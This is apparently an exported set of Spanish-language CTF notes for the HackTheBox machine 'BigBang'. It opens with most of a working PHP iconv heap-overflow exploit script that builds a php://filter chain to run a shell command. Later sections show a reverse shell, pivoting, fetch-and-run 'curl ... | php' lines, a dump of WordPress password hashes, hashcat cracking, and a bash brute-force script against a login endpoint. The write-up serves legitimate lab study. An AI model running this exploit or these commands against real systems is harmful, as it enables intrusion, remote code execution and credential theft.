    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -&gt; None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -&gt; bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -&gt; bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) &gt; 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if len(set(result).intersection(set(text))) == 0:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -&gt; bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -&gt; list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
        
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -&gt; None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.6"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -&gt; None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -&gt; Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size &gt;= HEAP_SIZE
            and region.stop &amp; (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) &gt; 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -&gt; None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -&gt; str:

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap-&gt;free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) &lt;= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages) 
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -&gt; None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep &lt;= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -&gt; bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -&gt; bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -&gt; bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -&gt; bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -&gt; bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -&gt; int:
        return self.stop - self.start


Exploit()
<br><img alt="Pasted image 20250202210905.png" src="machines/bigbang/imgs/pasted-image-20250202210905.png"><br><br>]]></description><link>machines/bigbang/01-recon.html</link><guid isPermaLink="false">Machines/BigBang/01-Recon.md</guid><pubDate>Mon, 24 Feb 2025 15:45:48 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250131121917.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/bigbang/imgs/pasted-image-20250131121917.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[User www-data]]></title><description><![CDATA[ 
 <br><br><br>Al estar en un contenedor no tenemos comandos como ss ni netstat pero si wget<br><br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ cat /proc/net/tcp
cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                                                                        
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0                                                                        
   1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24                                                                      
   2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1                                                                      
   3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1                                                                        
   4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1             
<br><br><br><br>Conexion 1<br>0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0
<br>
<br>Local Address (00000000:0050) :

<br>IP: 0.0.0.0 (escucha en todas las interfaces).
<br>Puerto: 0x0050 = 80 (HTTP).


<br>Remote Address (00000000:0000) :

<br>IP: 0.0.0.0 (sin conexión remota).
<br>Puerto: 0 (ningún puerto remoto asignado).


<br>Estado (0A) : Estado LISTEN (esperando conexiones entrantes).
<br>UID : 0 (proceso pertenece al usuario root o sistema).
<br>Descripción : Esta es una conexión HTTP que está escuchando en el puerto 80. (el blog)
<br>Conexion 2<br>1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24
<br>
<br>Local Address (030011AC:9A3C) :

<br>IP: 192.168.0.3 (convertido de 030011AC).
<br>Puerto: 0x9A3C = 39484.


<br>Remote Address (2A100A0A:115C) :

<br>IP: 10.16.42.42 (convertido de 2A100A0A).
<br>Puerto: 0x115C = 4444.


<br>Estado (01) : Estado ESTABLISHED (conexión activa).
<br>UID : 33 (generalmente el usuario www-data en sistemas web).
<br>Descripción : Una conexión establecida desde 192.168.0.3:39484 hacia 10.16.42.42:4444. (nuestra rev-shell)
<br>Conexion 3 <br>2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1
<br>
<br>Local Address (030011AC:9CD6) :

<br>IP: 192.168.0.3.
<br>Puerto: 0x9CD6 = 39958.


<br>Remote Address (010011AC:0CEA) :

<br>IP: 192.168.0.1.
<br>Puerto: 0x0CEA = 3306 (puerto MySQL).


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Una conexión establecida desde 192.168.0.3:39958 hacia 192.168.0.1:3306 (base de datos MySQL de la cual ya tenemos credenciales (wp-config.php de recon).
<br>Conexion 4<br>3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1
<br>
<br>Local Address (030011AC:E4A8) :

<br>IP: 192.168.0.3.
<br>Puerto: 0xE4A8 = 58536.


<br>Remote Address (010011AC:0CEA) :

<br>IP: 192.168.0.1.
<br>Puerto: 0x0CEA = 3306 (MySQL).


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Otra conexión hacia la base de datos MySQL en 192.168.0.1:3306.
<br>Conexion 5<br>4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1
<br>
<br>Local Address (030011AC:A3B0) :

<br>IP: 192.168.0.3.
<br>Puerto: 0xA3B0 = 41872.


<br>Remote Address (400E0A0A:115C) :

<br>IP: 10.14.10.64.
<br>Puerto: 0x115C = 4444.


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Una conexión establecida desde 192.168.0.3:41872 hacia 10.14.10.64:4444.
<br><br><br>Vamos a usar ligolo-ng para hacer pivoting creando un puente entre la maquina y nuestro host:<br> ligolo en vez de usar un SOCKS proxy o TCP/UDP fowarding, Ligolo-ng crea un userland network stack usando  <a data-tooltip-position="top" aria-label="https://gvisor.dev/" rel="noopener nofollow" class="external-link" href="https://gvisor.dev/" target="_blank">Gvisor</a>.<br>Esta herramienta nos permite pivotar en la maquina de forma muchisimo mas rapida de lo que podria hacer chisel o meterpreter<br>Subimos a la máquina victima (derecha) el agent y desde el host (izquierda) ajustamos el proxy; Una vez establecido el tunel podemos ver que tenemos conexión con el puerto 3306 de la victima (mysql)<br>
<img alt="Pasted image 20250203003144.png" src="machines/bigbang/imgs/pasted-image-20250203003144.png"><br>Probamos a conectarnos al mysql :<br>Intento conectarme al servidor de mysql sin exito<br>
<img alt="Pasted image 20250203003751.png" src="machines/bigbang/imgs/pasted-image-20250203003751.png"><br>
Aun con el tunel establecido no soy capaz de entablar la conexion; eso significa que o bien el mysql no esta corriendo (no es el caso) o tiene un cortafuegos.<br>La maquina victima (dockerizada) no tiene el binario mysql pero si que sabemos que tiene php por lo que podemos intentar entrar en la base de datos mediante un script ;<br>&lt;?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';

$conn = new mysqli($host, $user, $pass, $db);

if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
echo "Connected successfully\n";

$result = $conn-&gt;query("SHOW TABLES");
while ($row = $result-&gt;fetch_row()) {
    echo $row[0] . "\n";
}
$conn-&gt;close();
?&gt;
<br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/trythis.php | php
&lt;s/wp-admin$ curl 10.10.14.64:8000/trythis.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   379  100   379    0     0   1041      0 --:--:-- --:--:-- --:--:--  1044
Connected successfully
wp_commentmeta
wp_comments
wp_links
wp_options
wp_postmeta
wp_posts
wp_term_relationships
wp_term_taxonomy
wp_termmeta
wp_terms
wp_usermeta
wp_users
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ 
<br>Bingo!<br>sacamos los datos de la tabla wp_users:<br>&lt;?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';


$conn = new mysqli($host, $user, $pass, $db);


if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
echo "Connected successfully\n";


$query = "SELECT * FROM wp_users";
$result = $conn-&gt;query($query);

// Verificar si hay resultados
if ($result-&gt;num_rows &gt; 0) {
    // Iterar sobre cada fila de la tabla wp_users
    while ($row = $result-&gt;fetch_assoc()) {
        // Imprimir todas las columnas de la fila
        foreach ($row as $key =&gt; $value) {
            echo "$key: $value\n";
        }
        echo "------------------------\n"; // Separador entre usuarios
    }
} else {
    echo "No se encontraron registros en la tabla wp_users.\n";
}


$conn-&gt;close();
?&gt;
<br>voi là !<br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/wp_users.php | php
&lt;/wp-admin$ curl 10.10.14.64:8000/wp_users.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   963  100   963    0     0   4125      0 --:--:-- --:--:-- --:--:--  4133
Connected successfully
ID: 1
user_login: root
user_pass: $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
user_nicename: root
user_email: root@bigbang.htb
user_url: http://blog.bigbang.htb
user_registered: 2024-05-31 13:06:58
user_activation_key: 
user_status: 0
display_name: root
------------------------
ID: 3
user_login: shawking
user_pass: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
user_nicename: shawking
user_email: shawking@bigbang.htb
user_url: 
user_registered: 2024-06-01 10:39:55
user_activation_key: 
user_status: 0
display_name: Stephen Hawking
------------------------

<br>Bueno a crackear esas passwords!<br>➜  BigBang hashcat --identify shawkinghash 
The following hash-mode match the structure of your input hash:
      # | Name                                                       | Category
  ======+============================================================+======================================
    400 | phpass                                                     | Generic KDF
<br><br><br>Crackeamos el el phpass<br>
hashcat -a 0 -m 400 shawkinghash /usr/share/wordlists/rockyou.txt

$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
Time.Started.....: Mon Feb  3 20:49:54 2025 (12 mins, 36 secs)
Time.Estimated...: Mon Feb  3 21:02:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5901 H/s (10.65ms) @ Accel:256 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4456448/14344385 (31.07%)
Rejected.........: 0/4456448 (0.00%)
Restore.Point....: 4454400/14344385 (31.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7936-8192
Candidate.Engine.: Device Generator
Candidates.#1....: quaqua8 -&gt; qu956421
Hardware.Mon.#1..: Temp: 82c Util: 89%

Started: Mon Feb  3 20:49:51 2025
Stopped: Mon Feb  3 21:02:31 2025

<br>Usamos esa clave para conectarnos por ssh a la maquina y el usuario shawking<br>]]></description><link>machines/bigbang/02-exploitation.html</link><guid isPermaLink="false">Machines/BigBang/02-exploitation.md</guid><pubDate>Wed, 05 Feb 2025 16:16:06 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250203003144.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/bigbang/imgs/pasted-image-20250203003144.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-User-Shawking]]></title><description><![CDATA[ 
 <br><br>Empezamos por enumerar los usuarios del sistema que manejen una bash<br>shawking@bigbang:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:George Hubble:/home/george:/bin/bash
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
<br>Parece que tenemos dos usuarios mas escalables en el sistema; george y developer. Guardaremos la infor para mas adelante.<br>Sudo -l :<br>
not my luckiest day...<br>shawking@bigbang:~$ sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.
<br>Cron:<br>shawking@bigbang:~$ crontab -e
no crontab for shawking - using an empty one
<br>Netstat<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:3306         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42669         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -       
<br>Puede que tengamos algo jugosillo en ese puerto 9090<br>Intento hacer pivoting para ver que hay en ese puerto 9090<br>
pero nada;<br>
<img alt="Pasted image 20250204001637.png" src="machines/bigbang/imgs/pasted-image-20250204001637.png"><br>shawking@bigbang:~$ nc -nz 127.0.0.1 9090
shawking@bigbang:~$ echo $?
0

<br>Parece que el puerto funciona;<br>Probamos el puerto con un tunel ssh:<br>ssh shawking@bigbang.htb -L 9090:127.0.0.1:9090
<br>Escaneando con FeroxBuster encontramos un /login y un /command en la pagina web<br>405      GET        5l       20w      153c http://127.0.0.1:9090/login
405      GET        5l       20w      153c http://127.0.0.1:9090/command

<br><img alt="Pasted image 20250204110951.png" src="machines/bigbang/imgs/pasted-image-20250204110951.png"><br>Nos da un 405<br>
<img alt="Pasted image 20250204111114.png" src="machines/bigbang/imgs/pasted-image-20250204111114.png"><br><br>Segun nuestro analisis previo el endpoint en el :9090 es un servidor web<br>sudo nmap -sCV -Pn -n -p 9090 127.0.0.1 --script http-methods      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 11:46 CET
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.83% done; ETC: 11:46 (0:00:00 remaining)
Nmap scan report for 127.0.0.1
Host is up (0.000069s latency).

PORT     STATE SERVICE VERSION
9090/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.10.12)
|_http-server-header: Werkzeug/3.0.3 Python/3.10.12

<br>Fuzz:<br>
del fuzz sacamos los siguientes endpoints<br>
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:9090/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 404ms]
command                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 177ms]
<br>Endpoints:<br>
<a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/login" target="_blank">http://127.0.0.1:9090/login</a><br>
<a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/command" target="_blank">http://127.0.0.1:9090/command</a><br><br>Vamos a hacer bruteforce para intentar entrar como el usuario "developer" en <a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/login" target="_blank">http://127.0.0.1:9090/login</a><br>#!/bin/bash


URL="http://127.0.0.1:9090/login"

PASSWORD_FILE="/usr/share/wordlists/rockyou.txt"


USERNAME="developer"


while IFS= read -r PASSWORD; do
  echo "Probando pass: $PASSWORD"

  RESPONSE=$(curl -X POST -s -o /dev/null -w "%{http_code}" "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}")

  
  if [ "$RESPONSE" != "405" ]  &amp;&amp; [ "$RESPONSE" != "401" ]; then
    echo "¡Contraseña encontrada! -&gt; $PASSWORD"
    echo "respuesta: $RESPONSE"
    break
  fi
done &lt; $PASSWORD_FILE

<br>bingo bingo bingo<br>¡Contraseña encontrada! -&gt; bigbang
respuesta: 200
<br><br>Podemos loguearnos al usuario developer con la misma password; en ella encontramos un archivo .apk en al siguiente ruta :<br>
/home/developer/android/satellite-app.apk<br><br>➜  9090 curl -X POST -v 127.0.0.1:9090/login \    
-H "Content-Type: application/json" \
-d '{"username":"developer","password":"bigbang"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1:9090...
* Connected to 127.0.0.1 (127.0.0.1) port 9090
* using HTTP/1.x
&gt; POST /login HTTP/1.1
&gt; Host: 127.0.0.1:9090
&gt; User-Agent: curl/8.11.1
&gt; Accept: */*
&gt; Content-Type: application/json
&gt; Content-Length: 45
&gt; 
* upload completely sent off: 45 bytes
&lt; HTTP/1.1 200 OK
&lt; Server: Werkzeug/3.0.3 Python/3.10.12
&lt; Date: Tue, 04 Feb 2025 10:28:53 GMT
&lt; Content-Type: application/json
&lt; Content-Length: 356
&lt; Connection: close
&lt; 
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODY2NDkzMywianRpIjoiZmM5OGUzYzMtMTJlNy00MjYwLWFlZmEtZGMzZjlhMThhNGMwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODY2NDkzMywiY3NyZiI6IjIyNjBlMzBhLWNkY2YtNDYzZS1iZmZiLTUwYjNjNWEwZTIzNiIsImV4cCI6MTczODY2ODUzM30.oNh4nYggI9d8ue_IrB3yaV9luehyMiMYeQW3dgEOcm8"}
* shutting down connection #0

<br><br>Get no esta permitido pues probamos nuestra vieja confiable POST<br>
<img alt="Pasted image 20250205114416.png" src="machines/bigbang/imgs/pasted-image-20250205114416.png"><br>Permite POST:<br>shawking@bigbang:/home/shawking$ curl -X POST http://localhost:9090/command
{"msg":"Missing Authorization Header"}
<br>Para el authorization Header vamos a probar con el access_token que nos proporciono la pagina web en el /login<br>-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODc1NDkzMSwianRpIjoiMzU5MGRjODMtNjNjMC00OTgxLWI2NDQtZjQyODFhOWE1MjdmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODc1NDkzMSwiY3NyZiI6IjU1YmYyYjRkLTlkNTMtNGZlNS1hMDBkLWI5ZjJlYjRkYjhmOSIsImV4cCI6MTczODc1ODUzMX0.-FKF_--KXab_qc0LqvhSow5fIviN5YBPO6tS1QoW3wE"
<br>El endpoint acepta JSON data en este formato:<br>`{     
"command": "send_image",
"output_file": "works.jpg"
}`
